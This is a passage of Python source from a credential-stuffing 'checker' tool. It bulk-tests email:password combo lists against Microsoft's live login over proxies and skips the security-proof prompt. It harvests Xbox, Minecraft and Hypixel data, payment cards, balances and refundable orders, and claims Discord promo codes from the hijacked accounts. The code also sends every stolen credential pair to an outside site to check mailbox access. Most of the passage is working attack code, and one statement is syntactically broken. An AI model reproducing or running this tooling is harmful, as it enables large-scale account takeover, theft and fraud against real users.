                        hit_details += f' | Market={user_market}'
                    if profile_info and profile_info.get('fullName'):
                        hit_details += f' | Name={profile_info["fullName"]}'
                    write_to_file_no_duplicates(os.path.join(live_save_folder, 'hits.txt'), hit_details)
                if refundable_count > 0:
                    write_to_file_no_duplicates('refundable.txt', f'{combo} | Refundable Items: {refundable_count}')
                    ms_refundable_count += refundable_count
                if has_xbox:
                    write_to_file_no_duplicates('gamepasses.txt', combo)
                send_hit(capture_data)
            else:
                write_to_file_no_duplicates('hits0order.txt', combo)
                if live_save_folder:
                    write_to_file_no_duplicates(os.path.join(live_save_folder, 'valid.txt'), combo)
                capture_data = {'combo': combo, 'status': 'VALID', 'orders': 0, 'xbox': 'No', 'minecraft': minecraft_status, 'refundable': 0, 'profile_info': profile_info, 'user_market': user_market}
                ms_captures.append(capture_data)
            ms_checked_count += 1

    except Exception as e:
        with lock:
            ms_dead.append(combo)
            ms_captures.append({'combo': combo, 'status': 'ERROR', 'details': str(e)})
            ms_checked_count += 1
            if live_save_folder:
                write_to_file_no_duplicates(os.path.join(live_save_folder, 'dead.txt'), combo)


def mc_check_has_minecraft(email, password):
    """Check if account has Minecraft (via purchase or Game Pass)"""
    try:
        sess = requests.Session()
        sess.verify = False
        txt = sess.get(SFTTAG_URL, timeout=20, headers={'User-Agent': UA}).text
        url_post = re.search(r'"urlPost":"([^"]+)"', txt)
        ppft = re.search(r'value=\\"(.+?)\\"', txt, re.S)
        if not url_post or not ppft:
            return False
        url_post = url_post.group(1)
        ppft = ppft.group(1)
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
        r = sess.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=20)
        if '#' not in r.url or 'access_token=' not in r.url:
            return False
        from urllib.parse import urlparse, parse_qs
        fragment = urlparse(r.url).fragment
        rps_token = parse_qs(fragment).get('access_token', [None])[0]
        if not rps_token:
            return False
        j = {'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}, 'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'}
        xbl = sess.post('https://user.auth.xboxlive.com/user/authenticate', json=j, headers={'Content-Type': 'application/json'}, timeout=20)
        xbox_token = xbl.json().get('Token')
        uhs = xbl.json().get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        if not xbox_token or not uhs:
            return False
        j2 = {'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT'}
        xsts = sess.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=j2, headers={'Content-Type': 'application/json'}, timeout=20)
        xsts_token = xsts.json().get('Token')
        if not xsts_token:
            return False
        mc_login = sess.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'}, headers={'Content-Type': 'application/json'}, timeout=20)
        mc_token = mc_login.json().get('access_token')
        if not mc_token:
            return False
        r = sess.get('https://api.minecraftservices.com/entitlements/license', headers={'Authorization': f'Bearer {mc_token}'}, timeout=20)
        if r.status_code != 200:
            return False
        items = r.json().get('items', [])
        has_normal = any(it.get('name') in ['game_minecraft', 'product_minecraft'] and it.get('source') in ['PURCHASE', 'MC_PURCHASE'] for it in items)
        has_gp = any(it.get('name') in ['product_game_pass_pc', 'product_game_pass_ultimate'] for it in items)
        return bool(has_normal or has_gp)
    except Exception:
        return False


def check_minecraft_detailed(email, password, combo):
    """Enhanced Minecraft checker with SkyBlock coins, BedWars stars, MFA/SFA detection"""
    global ms_total_skyblock_coins, ms_total_bedwars_stars, ms_minecraft_mfa, ms_minecraft_sfa, ms_hypixel_count

    def log_mc(msg):
        try:
            if SETTINGS.get('enable_file_logging', False):
                with open(MINECRAFT_LOG_FILE, 'a', encoding='utf-8') as f:
                    f.write(f'[DEBUG] {combo} | {msg}\n')
        except Exception:
            pass

    try:
        sess = requests.Session()
        sess.verify = False
        txt = sess.get(SFTTAG_URL, timeout=20, headers={'User-Agent': UA}).text
        url_post_match = re.search(r'"urlPost":"([^"]+)"', txt)
        ppft_match = re.search(r'value=\\"(.+?)\\"', txt, re.S)
        if not url_post_match or not ppft_match:
            log_mc('Failed to extract urlPost/PPFT from login form')
            return None

        url_post = url_post_match.group(1)
        ppft = ppft_match.group(1)
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
        r = sess.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA}, allow_redirects=True, timeout=20)

        # Detect MFA/SFA
        access_type = 'SFA'
        try:
            mail_access = requests.get(f'https://email.avine.tools/check?email={email}&password={password}', verify=False, timeout=10)
            if mail_access.status_code == 200 and mail_access.json().get('Success') == 1:
                access_type = 'MFA'
        except Exception:
            if 'https://account.live.com/proofs/Add' in getattr(r, 'text', ''):
                access_type = 'MFA'

        # Handle proofs
        if hasattr(r, 'text') and 'https://account.live.com/proofs/Add' in r.text:
            try:
                ipt = r.text.split('id="ipt" value="')[1].split('"')[0]
                pprid = r.text.split('id="pprid" value="')[1].split('"')[0]
                uaid = r.text.split('id="uaid" value="')[1].split('"')[0]
                fmHf = r.text.split('id="fmHF" action="')[1].split('"')[0]
                resp1 = sess.post(fmHf, data=f'ipt={ipt}&pprid={pprid}&uaid={uaid}', headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA}, timeout=20)
                canary = resp1.text.split('id="canary" name="canary" value="')[1].split('"')[0]
                skip_data = {'iProofOptions': 'Email', 'DisplayPhoneCountryISO': 'US', 'DisplayPhoneNumber': '', 'EmailAddress': '', 'canary': canary, 'action': 'Skip', 'PhoneNumber': '', 'PhoneCountryISO': ''}
                sess.post(resp1.text.split('id="frmAddProof" method="post" action="')[1].split('"')[0], data=skip_data, headers={'User-Agent': UA}, timeout=20)
            except Exception as e:
                log_mc(f'Proofs skip failed: {e}')

        # Get RPS token
        if '#' not in r.url or 'access_token=' not in r.url:
            log_mc('No access_token in redirect URL')
            return None

        from urllib.parse import urlparse, parse_qs
        fragment = urlparse(r.url).fragment
        rps_token = parse_qs(fragment).get('access_token', [None])[0]
        if not rps_token:
            log_mc('Failed to parse RPS token')
            return None

        # Xbox auth
        j = {'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}, 'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'}
        xbl = sess.post('https://user.auth.xboxlive.com/user/authenticate', json=j, headers={'Content-Type': 'application/json', 'User-Agent': UA}, timeout=20)
        xbox_token = xbl.json().get('Token')
        uhs = xbl.json().get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        if not xbox_token or not uhs:
            log_mc('Xbox user token/uhs missing')
            return None

        # XSTS
        j2 = {'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT'}
        xsts = sess.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=j2, headers={'Content-Type': 'application/json'}, timeout=15)
        try:
            js = xsts.json()
            xsts_token = js.get('Token')
            uhs = js.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs', uhs)
        except Exception:
            xsts_token = None
        if not xsts_token:
            log_mc('XSTS token missing')
            return None

        # Minecraft login
        mc_login = sess.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'}, headers={'Content-Type': 'application/json'}, timeout=15)
        mc_token = mc_login.json().get('access_token')
        if not mc_token:
            log_mc('MC access token missing')
            return None

        # Check entitlements
        ent = sess.get('https://api.minecraftservices.com/entitlements/license', headers={'Authorization': f'Bearer {mc_token}'}, timeout=15)
        if ent.status_code != 200:
            return None
        items = ent.json().get('items', [])
        has_mc = any(it.get('name') in ['game_minecraft', 'product_minecraft'] for it in items)
        has_gp = any(it.get('name') in ['product_game_pass_pc', 'product_game_pass_ultimate'] for it in items)
        if not has_mc and not has_gp:
            return None

        # Get profile
        prof = sess.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=15)
        if prof.status_code != 200:
            return None
        username = prof.json().get('name', 'Unknown')

        # Skyblock
        total_coins = 0.0
        skyblock_data = 'No data'
        try:
            addinfo = requests.get(f'https://sky.shiiyu.moe/api/v2/coins/{username}/', timeout=10).json()
            if 'error' not in addinfo and 'profiles' in addinfo:
                profiles = []
                for _, v in addinfo['profiles'].items():
                    purse = float(v.get('purse', 0) or 0)
                    bank = float(v.get('bank', 0) or 0)
                    profiles.append({'name': v.get('cute_name', 'Unknown'), 'purse': purse, 'bank': bank, 'total': purse + bank})
                    total_coins += purse + bank
                skyblock_data = profiles
        except Exception:
            pass

        # Hypixel
        bedwars_stars = 0.0
        hypixel_data = {}
        if SETTINGS.get('enable_hypixel_api', False):
            try:
                hypixel_resp = requests.get(f'https://plancke.io/hypixel/player/stats/{username}', timeout=10, headers={'User-Agent': UA}, verify=False)
                if hypixel_resp.status_code == 200:
                    hypixel_text = hypixel_resp.text
                    try:
                        hypixel_level = re.search(r'(?<=Level:</b> ).+?(?=<br/><b>)', hypixel_text).group()
                        hypixel_data['level'] = hypixel_level
                    except:
                        pass
                    try:
                        bedwars_stars_str = re.search(r'(?<=<li><b>Level:</b> ).+?(?=</li>)', hypixel_text).group()
                        bedwars_stars = float(bedwars_stars_str.replace(',', '').replace('★', '').strip())
                        hypixel_data['bedwars_stars'] = bedwars_stars
                    except:
                        pass
                    try:
                        first_login = re.search(r'(?<=<b>First login: </b>).+?(?=<br/><b>)', hypixel_text).group()
                        hypixel_data['first_login'] = first_login
                    except:
                        pass
                    try:
                        last_login = re.search(r'(?<=<b>Last login: </b>).+?(?=<br/>)', hypixel_text).group()
                        hypixel_data['last_login'] = last_login
                    except:
                        pass
            except Exception as e:
                log_mc(f'Hypixel stats fetch failed: {e}')

        # Update global stats
        with lock:
            if access_type == 'MFA':
                ms_minecraft_mfa += 1
            else:
                ms_minecraft_sfa += 1
            if SETTINGS.get('enable_hypixel_api', False):
                ms_total_skyblock_coins += total_coins
                ms_total_bedwars_stars += bedwars_stars
                if hypixel_data:
                    ms_hypixel_count += 1

        # Save
        os.makedirs('minecraft', exist_ok=True)
        mc_file = os.path.join('minecraft', f'{access_type}.txt')
        mc_line = f'{combo} | Username: {username} | Access: {access_type}\n'
        if SETTINGS.get('enable_hypixel_api', False):
            if hypixel_data:
                mc_line += '  Hypixel Stats:\n'
                if 'level' in hypixel_data:
                    mc_line += f'    Level: {hypixel_data["level"]}\n'
                if 'bedwars_stars' in hypixel_data:
                    mc_line += f'    BedWars Stars: {hypixel_data["bedwars_stars"]:,.1f}\n'
            if isinstance(skyblock_data, list) and skyblock_data:
                skyblock_str = '\n'.join([f'    Profile: {p["name"]} | Purse: {p["purse"]:,} | Bank: {p["bank"]:,} | Total: {p["total"]:,}' for p in skyblock_data])
                mc_line += f'  SkyBlock:\n{skyblock_str}\n'
        write_to_file_no_duplicates(mc_file, mc_line)
        return {'username': username, 'access_type': access_type, 'skyblock_data': skyblock_data, 'total_coins': total_coins, 'bedwars_stars': bedwars_stars, 'hypixel_data': hypixel_data}

    except Exception as e:
        log_mc(f'Overall error: {e}')
        return None


def pull_single_promo(combo, proxy=None):
    """Pull Discord promo for a single account"""
    global ms_promo_count

    def log_result(status, message=''):
        try:
            with open(PROMO_DEBUG_LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(f'[{status}] {combo} | {message}\n')
        except Exception:
            pass

    try:
        if '|' in combo:
            email = combo.split('|')[0].strip()
            password = combo.split('|')[1].strip()
        else:
            email = combo.split(':')[0]
            password = combo.split(':')[1]
    except Exception:
        log_result('ERROR', 'Invalid format')
        return {'status': 'error', 'message': 'Invalid format'}

    sess = requests.Session()
    sess.verify = False
    if proxy:
        parsed_proxy = parse_proxy(proxy)
        if 'error' not in parsed_proxy:
            proxy_url = 'http://'
            if parsed_proxy.get('user') and parsed_proxy.get('pass'):
                proxy_url += f'{parsed_proxy["user"]}:{parsed_proxy["pass"]}@'
            proxy_url += f'{parsed_proxy["host"]}:{parsed_proxy["port"]}'
            sess.proxies = {'http': proxy_url, 'https': proxy_url}

    try:
        txt = sess.get(SFTTAG_URL, timeout=20, headers={'User-Agent': UA}).text
        url_post = re.search(r'"urlPost":"([^"]+)"', txt)
        ppft = re.search(r'value=\\"(.+?)\\"', txt, re.S)
        if not url_post or not ppft:
            log_result('ERROR', 'Failed to get login form')
            return {'status': 'error', 'message': 'Failed to get login form'}

        url_post = url_post.group(1)
        ppft = ppft.group(1)
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
        r = sess.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=20)

        if '#' not in r.url or 'access_token=' not in r.url:
            log_result('DEAD', 'Invalid credentials')
            return {'status': 'dead', 'message': 'Invalid credentials'}

        from urllib.parse import urlparse, parse_qs
        fragment = urlparse(r.url).fragment
        access_token = parse_qs(fragment).get('access_token', [None])[0]
        if not access_token:
            log_result('ERROR', 'Failed to get access token')
            return {'status': 'dead', 'message': 'Failed to get access token'}

        # Xbox auth
        j = {'Properties': {'AuthMethod': 'RPS', 'RpsTicket': access_token, 'SiteName': 'user.auth.xboxlive.com'}, 'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'}
        xbl = sess.post('https://user.auth.xboxlive.com/user/authenticate', json=j, headers={'Content-Type': 'application/json', 'x-xbl-contract-version': '1'}, timeout=20)
        if xbl.status_code != 200:
            log_result('ERROR', f'User token error: {xbl.status_code}')
            return {'status': 'error', 'message': f'User token error: {xbl.status_code}'}

        userToken = xbl.json().get('Token')
        uhs = xbl.json().get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        if not userToken or not uhs:
            log_result('ERROR', 'Invalid Xbox token response')
            return {'status': 'error', 'message': 'Invalid Xbox token response'}

        # XSTS
        j2 = {'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT', 'Properties': {'UserTokens': [userToken], 'SandboxId': 'RETAIL'}}
        xsts_response = sess.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=j2, headers={'Content-Type': 'application/json', 'x-xbl-contract-version': '1'}, timeout=20)
        if xsts_response.status_code != 200:
            if xsts_response.status_code == 401:
                log_result('2FA', '2FA Required or Account Restricted')
                return {'status': '2fa', 'message': '2FA Required or Account Restricted'}
            log_result('ERROR', f'XSTS error: {xsts_response.status_code}')
            return {'status': 'error', 'message': f'XSTS error: {xsts_response.status_code}'}

        xsts_token = xsts_response.json().get('Token')
        xsts_uhs = xsts_response.json().get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        if not xsts_token or not xsts_uhs:
            log_result('ERROR', 'Invalid XSTS token')
            return {'status': 'error', 'message': 'Invalid XSTS token'}

        xbl_auth = f'XBL3.0 x={xsts_uhs};{xsts_token}'

        # Fetch promo - try v3 first, fall back to v2
        nitro_offer_id = 'A3525E6D4370403B9763BCFA97D383D9'
        response = None
        response_json = None
        for ver in ('v3', 'v2'):
            try:
                response = sess.post(f'https://profile.gamepass.com/{ver}/offers/{nitro_offer_id}/', headers={'authorization': xbl_auth, 'User-Agent': UA}, timeout=20)
                if response.status_code == 200:
                    response_json = response.json()
                    break
            except Exception:
                continue
        if not response or response.status_code != 200:
            if response and 'ineligible' in response.text.lower():
                log_result('INELIGIBLE', 'Not eligible for promo')
                return {'status': 'ineligible', 'message': 'Account ineligible for promo'}
            log_result('ERROR', f'Promo API error: {response.status_code if response else "no response"}')
            return {'status': 'error', 'message': f'Promo API error: {response.status_code if response else "no response"}'}

        if not response_json:
        if 'resource' not in response_json:
            if 'ineligible' in str(response_json).lower():
                log_result('INELIGIBLE', 'Not eligible for promo')
                return {'status': 'ineligible', 'message': 'Account ineligible'}
            log_result('ERROR', 'No promo resource in response')
            return {'status': 'error', 'message': 'No promo resource in response'}

        link = response_json['resource']
        code = link.split('/')[-1]

        # Check Discord
        promo_status = 'valid'
        already_claimed = False
        days_left = 'Unknown'
        try:
            discord_check = sess.get(f'https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true', timeout=20)
            if discord_check.status_code == 200:
                discord_data = discord_check.json()
                uses = discord_data.get('uses', 0)
                if uses == 1:
                    already_claimed = True
                    promo_status = 'claimed'
                expires_at = discord_data.get('expires_at')
                if expires_at:
                    try:
                        from datetime import datetime, timezone
                        from dateutil import parser as date_parser
                        expires_date = date_parser.isoparse(expires_at)
                        now = datetime.now(timezone.utc)
                        delta = expires_date - now
                        days_left = max(0, delta.days)
                    except Exception:
                        days_left = 'Unknown'
        except Exception:
            pass

        if promo_status == 'valid':
            with lock:
                ms_promo_count += 1
            os.makedirs('promos', exist_ok=True)
            write_to_file_no_duplicates('promos/discord_promos.txt', f'{email} | {link} | Status=unclaimed | Days Left={days_left}')
            log_result('VALID', f'Promo: {link}')
        else:
            log_result('CLAIMED', f'Promo: {link}')

        return {'status': 'success', 'link': link, 'code': code, 'promo_status': promo_status, 'already_claimed': already_claimed}

    except Exception as e:
        log_result('ERROR', f'Unexpected error: {str(e)[:50]}')
        return {'status': 'error', 'message': f'Unexpected error: {str(e)[:50]}'}


def generate_microsoft_table(total_combos):
    """Generate live UI table for Microsoft checker"""
    elapsed = time.time() - ms_start_time
    cpm = ms_checked_count / elapsed * 60 if elapsed > 0 else 0
    s_hit = f'bold {to_rgb_str(THEME["success_color"])}'
    s_valid = f'bold {to_rgb_str(THEME["hit_color"])}'
    s_dead = f'bold {to_rgb_str(THEME["dead_color"])}'
    s_error = f'bold {to_rgb_str(THEME["error_color"])}'
    s_checked = f'bold {to_rgb_str(THEME["disclaimer_end"])}'
    s_cpm = f'bold {to_rgb_str(THEME["highlight_fg"])}'
    s_border = to_rgb_str(THEME['custom_color'])
    s_ascii = to_rgb_str(THEME['ascii_color'])

    stats_lines = [
        f'[{s_hit}]HITS[/]       : [{s_hit}]{len(ms_hits)}[/]',
        f'[{s_valid}]VALID[/]      : [{s_valid}]{len(ms_valid)}[/]',
        f'[{s_dead}]DEAD[/]       : [{s_dead}]{len(ms_dead)}[/]',
        f'[{s_checked}]CHECKED[/]    : [{s_checked}]{ms_checked_count}/{total_combos}[/]',
        f'[{s_cpm}]CPM[/]        : [{s_cpm}]{int(cpm)}[/]',
        f'[{s_hit}]MINECRAFT[/]  : [{s_hit}]{ms_minecraft_count}[/] (MFA:{ms_minecraft_mfa}/SFA:{ms_minecraft_sfa})',
    ]
    if SETTINGS.get('enable_hypixel_api', False):
        stats_lines.extend([
            f'[{s_valid}]SKYBLOCK $[/] : [{s_valid}]{ms_total_skyblock_coins:,.0f}[/]',
            f'[{s_hit}]BEDWARS ★[/]  : [{s_hit}]{ms_total_bedwars_stars:,.1f}[/]',
            f'[{s_valid}]HYPIXEL[/]    : [{s_valid}]{ms_hypixel_count}[/]',
        ])
    stats_lines.extend([
        f'[{s_hit}]SUBS[/]       : [{s_hit}]{ms_subscriptions_count}[/]',
        f'[{s_valid}]GIFT CODES[/] : [{s_valid}]{ms_codes_count}[/] ([green]{ms_codes_valid_count}[/] valid)',
        f'[{s_error}]REFUNDABLE[/] : [{s_error}]{ms_refundable_count}[/]',
        f'[{s_valid}]CARDS[/]      : [{s_valid}]{ms_cards_count}[/]',
        f'[{s_error}]BALANCE[/]    : [{s_error}]{ms_balance_count}[/]',
        f'[{s_hit}]REWARDS[/]    : [{s_hit}]{ms_rewards_count}[/] ({ms_total_rewards_points:,} pts)',
    ])

    with lock:
        last_captures = ms_captures[-15:]

    captures_table = Table(box=ROUNDED, expand=True, show_header=False)
    captures_table.add_column()
    if not last_captures:
        captures_table.add_row('No captures yet...')
    else:
        for capture in last_captures:
            status = capture.get('status', 'N/A')
            c = capture.get('combo', 'N/A')
            details = ''
            if status == 'VALID' or status == 'HIT':
                details = f'| Orders={capture.get("orders", 0)}'
            elif status == '2FA':
                details = '| Requires 2FA'
            elif status == 'ERROR':
                details = f'| {capture.get("details", "Unknown error")}'
            color_style = {'HIT': s_hit, 'VALID': s_valid, 'DEAD': s_dead, 'ERROR': s_error, '2FA': s_error}.get(status, 'white')
            captures_table.add_row(f'[{color_style}]{status:<7}[/{color_style}] {c} {details}')

    layout_table = Table.grid(expand=True)
    layout_table.add_column()
    top_row = Table.grid(expand=True)
    top_row.add_column()
    top_row.add_column(width=45)
    top_row.add_row(
        Panel('\n'.join(stats_lines), title='[bold]🪟 Microsoft Fetcher 🪟[/bold]', border_style=s_border),
        Panel(captures_table, title='[bold]📥 Latest Captures 📥[/bold]', border_style=s_border),
    )
    layout_table.add_row(top_row)
    layout_table.add_row(Panel(Text(OWL_ASCII, style=s_ascii, justify='center'), border_style=s_border))
    cancel_text = Text('Cancelling...', justify='center', style=f'bold {to_rgb_str(THEME["error_color"])}') if cancel_event.is_set() else Text("Press 'C' to Cancel", justify='center', style='dim')
    layout_table.add_row(Panel(cancel_text, border_style=s_border, padding=(0, 1)))
    return layout_table


def save_microsoft_results():
    """Save Microsoft checker results to live save folder"""
    if not any([ms_hits, ms_valid, ms_errors, ms_dead]):
        return None
    folder_path = live_save_folder if live_save_folder else os.path.join('results', 'microsoft', datetime.now().strftime('%Y-%m-%d_%H-%M-%S'))
    os.makedirs(folder_path, exist_ok=True)
    with open(os.path.join(folder_path, 'hits.txt'), 'w', encoding='utf-8') as f:
        for c in ms_hits:
            capture_data = None
            for cap in ms_captures:
                if cap.get('combo') == c:
                    capture_data = cap
                    break
            if capture_data:
                f.write(f'{c} | Orders={capture_data.get("orders", 0)} | Xbox={capture_data.get("xbox", "N/A")} | Minecraft={capture_data.get("minecraft", "N/A")}\n')
            else:
                f.write(c + '\n')
    with open(os.path.join(folder_path, 'valid.txt'), 'w', encoding='utf-8') as f:
        for c in ms_valid:
            f.write(c + '\n')
    with open(os.path.join(folder_path, 'errors.txt'), 'w', encoding='utf-8') as f:
        for c in ms_errors:
            f.write(c + '\n')
    with open(os.path.join(folder_path, 'dead.txt'), 'w', encoding='utf-8') as f:
        for c in ms_dead:
            f.write(c + '\n')
    return folder_path


def run_microsoft_checker():
    """Main Microsoft checker function"""
    global ms_errors, ms_dead, live_save_folder, ms_captures, results_base_folder
    global ms_hits, ms_start_time, ms_checked_count, ms_valid
    global ms_minecraft_count, ms_codes_count, ms_codes_valid_count, ms_refundable_count
    global ms_paypal_count, ms_cards_count, ms_balance_count
    global ms_minecraft_mfa, ms_minecraft_sfa, ms_total_skyblock_coins, ms_total_bedwars_stars
    global ms_hypixel_count, ms_subscriptions_count

    if not run_start_cancel_prompt('Preparing to launch the Microsoft Fetcher.'):
        return

    combo_path = open_file_dialog('Select your email:pass combo file')
    if not combo_path:
        show_message('No combo file selected.', THEME['error_color'])
        return

    try:
        with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if line.strip()]
    except Exception as e:
        show_message(f'Error reading combo file: {e}', THEME['error_color'])
        return

    if not combos:
        show_message('Combo file is empty.', THEME['error_color'])
        return

    use_separate_folder = run_yes_no_prompt('Create separate results folder for this run?')
    if use_separate_folder:
        combo_filename = os.path.splitext(os.path.basename(combo_path))[0]
        results_base_folder = os.path.join('results', combo_filename)
        os.makedirs(results_base_folder, exist_ok=True)
    else:
        results_base_folder = ''

    enable_logging = run_yes_no_prompt('Enable File Logging?')
    SETTINGS['enable_file_logging'] = enable_logging

    use_proxies = run_yes_no_prompt('Do you want to use proxies for this check?')
    proxies = None
    if use_proxies:
        loaded_proxies = SETTINGS.get('proxy')
        if not loaded_proxies:
            show_message('No proxies loaded.', THEME['error_color'])
            return
        proxies = [loaded_proxies] if isinstance(loaded_proxies, str) else loaded_proxies if isinstance(loaded_proxies, list) else None

    enable_minecraft = run_yes_no_prompt('Enable Minecraft Checker?')
    if enable_minecraft:
        enable_skyblock = run_yes_no_prompt('Enable Hypixel Stats Fetch?')
        SETTINGS['enable_hypixel_api'] = enable_skyblock
    else:
        SETTINGS['enable_hypixel_api'] = False

    enable_full_capture = run_yes_no_prompt('Enable Full Capture?')

    if results_base_folder:
        live_save_folder = os.path.join(results_base_folder, 'live', datetime.now().strftime('%Y-%m-%d_%H-%M-%S'))
    else:
        live_save_folder = os.path.join('results', 'microsoft', datetime.now().strftime('%Y-%m-%d_%H-%M-%S'))
    os.makedirs(live_save_folder, exist_ok=True)

    ms_hits, ms_valid, ms_dead, ms_errors, ms_checked_count, ms_captures = [], [], [], [], 0, []
    ms_minecraft_count, ms_codes_count, ms_codes_valid_count, ms_refundable_count = 0, 0, 0, 0
    ms_paypal_count, ms_cards_count, ms_balance_count = 0, 0, 0
    ms_minecraft_mfa, ms_minecraft_sfa = 0, 0
    ms_total_skyblock_coins = 0.0
    ms_total_bedwars_stars = 0.0
    ms_hypixel_count = 0
    ms_subscriptions_count = 0
    ms_start_time = time.time()
    cancel_event.clear()
    stop_listening = threading.Event()
    listener_thread = threading.Thread(target=listen_for_cancel_key, args=(cancel_event, stop_listening), daemon=True)
    listener_thread.start()
    clear_terminal()
    executor = ThreadPoolExecutor(max_workers=SETTINGS.get('checker_threads', 25))

    try:
        with Live(generate_microsoft_table(len(combos)), console=console, screen=False, auto_refresh=False) as live:
            for combo in combos:
                if cancel_event.is_set():
                    break
                executor.submit(check_microsoft_account, combo, random.choice(proxies) if proxies else None, enable_minecraft, enable_full_capture)
            while ms_checked_count < len(combos):
                if cancel_event.is_set():
                    break
                live.update(generate_microsoft_table(len(combos)), refresh=True)
                time.sleep(0.1)
            live.update(generate_microsoft_table(len(combos)), refresh=True)
    except Exception:
        pass

    stop_listening.set()
    if not cancel_event.is_set():
        executor.shutdown(wait=True)
    else:
        executor.shutdown(wait=False)

    results_path = save_microsoft_results()

    if cancel_event.is_set():
        cancel_msg = 'Checker operation was cancelled.'
        if live_save_folder and os.path.exists(live_save_folder):
            cancel_msg += f'\n\nPartial results saved to:\n{live_save_folder}'
        show_message(cancel_msg, THEME['error_color'], vertical_center=True)
    else:
        # Show finished UI
        clear_terminal()
        console.print(Panel(f'[bold green]Finished! Results saved to: {results_path}[/bold green]', border_style='green'))
        console.print(f'\nHits: {len(ms_hits)} | Valid: {len(ms_valid)} | Dead: {len(ms_dead)} | Errors: {len(ms_errors)}')
        console.print('\n(Press any key to return)')
        get_key()


def run_search_tool():
    """Search through specific folder for products"""
    clear_terminal()
    set_title('Anomus - Search Tool')

    # Consolidate Game Pass files
    folders = ['specific', 'activesubs']
    gp_files = []
    for folder in folders:
        if os.path.exists(folder):
            for file in os.listdir(folder):
                if 'game pass' in file.lower() or 'xbox' in file.lower():
                    gp_files.append(os.path.join(folder, file))
    if gp_files:
        try:
            all_gp_accounts = set()
            for gp_file in gp_files:
                try:
                    with open(gp_file, 'r') as f:
                        for line in f.readlines():
                            account = line.strip().split('|')[0].strip()
                            all_gp_accounts.add(account)
                except Exception:
                    pass
            if all_gp_accounts:
                existing = set()
                if os.path.exists('gamepasses.txt'):
                    with open('gamepasses.txt', 'r') as f:
                        existing = set(line.strip() for line in f)
                new_accounts = all_gp_accounts - existing
                if new_accounts:
                    with open('gamepasses.txt', 'a') as gp_out:
                        for account in new_accounts:
                            gp_out.write(account + '\n')
                console.print(f'[green]✓[/green] Consolidated {len(all_gp_accounts)} Game Pass accounts to gamepasses.txt')
        except Exception as e:
            console.print(f'[red]✗[/red] Error consolidating Game Pass files: {e}')

    if not os.path.exists('specific'):
        show_message("The 'specific' folder does not exist.\nRun the fetcher first to generate results.", THEME['error_color'])
        return

    files = os.listdir('specific')
    if not files:
        show_message("No files found in 'specific' folder.\nRun the fetcher first to generate results.", THEME['error_color'])
        return

    display_colored_text('╔══════════════════════════════════════════════════════════╗', THEME['start_color'], THEME['end_color'])
    display_colored_text('║              🔍 PRODUCT SEARCH TOOL 🔍                   ║', THEME['start_color'], THEME['end_color'])
    display_colored_text('╚══════════════════════════════════════════════════════════╝', THEME['start_color'], THEME['end_color'])
    print('\n')
    search_term = get_user_input("Enter search terms (e.g., 'minecraft', 'game pass', 'office'):").lower()
    if not search_term:
        show_message('No search term entered.', THEME['error_color'])
        return

    matched_files = [f for f in files if search_term in f.lower()]
    if not matched_files:
        show_message(f"No products found matching '{search_term}'.", THEME['error_color'])
        return

    results = ''
    for f in matched_files:
        try:
            with open(f'specific/{f}', 'r', encoding='utf-8') as s:
                content = s.read()
                results += f'[{f}]\n{content}\n\n'
        except Exception:
            pass

    try:
        result_file = 'search_result.txt'
        with open(result_file, 'w', encoding='utf-8') as s:
            s.write(results)
        success_msg = f'✅ Successfully located {len(matched_files)} matching products!\n\n📁 Results saved to: {result_file}\n\nMatched files:\n'
        for f in matched_files[:10]:
            success_msg += f'  • {f}\n'
        if len(matched_files) > 10:
            success_msg += f'  ... and {len(matched_files) - 10} more'
        show_message(success_msg, THEME['success_color'])
    except Exception as e:
        show_message(f'Error saving results: {e}', THEME['error_color'])


def run_discord_promo_puller():
    """Standalone Discord Promo Puller"""
    global ms_promo_count
    if not run_start_cancel_prompt('Preparing to launch the Discord Promo Puller.'):
        return

    use_proxies = run_yes_no_prompt('Do you want to use proxies for promo pulling?')
    proxies = None
    if use_proxies:
        loaded_proxies = SETTINGS.get('proxy')
        if not loaded_proxies:
            show_message('No proxies loaded.', THEME['error_color'])
            return
        proxies = [loaded_proxies] if isinstance(loaded_proxies, str) else loaded_proxies if isinstance(loaded_proxies, list) else None

    if not os.path.exists('gamepasses.txt'):
        show_message('gamepasses.txt not found!\n\nRun the Microsoft Fetcher first.', THEME['error_color'])
        return

    try:
        with open('gamepasses.txt', 'r', encoding='utf-8', errors='ignore') as f:
